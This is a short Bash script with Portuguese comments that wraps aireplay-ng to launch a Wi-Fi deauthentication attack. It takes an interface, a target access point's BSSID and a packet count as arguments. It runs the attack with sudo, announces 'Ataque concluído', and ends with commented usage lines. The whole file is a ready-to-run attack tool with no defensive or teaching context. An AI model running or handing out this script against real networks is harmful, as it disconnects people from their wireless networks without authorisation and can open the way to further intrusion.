#!/bin/bash

# Verifica se o número correto de argumentos foi fornecido
if [ "$#" -ne 3 ]; then
    echo "Uso: $0 <interface> <bssid> <numero_de_pacotes>"
    exit 1
fi

# Atribui os argumentos a variáveis
interface=$1
bssid=$2
pac=$3

# Executa o comando de desautenticação
sudo aireplay-ng --deauth $pac -a $bssid $interface

echo "Ataque concluído."

# chmod +x ataque_deauth.sh
# ./ataque_deauth.sh wlan1mon 00:11:22:33:44:55 5
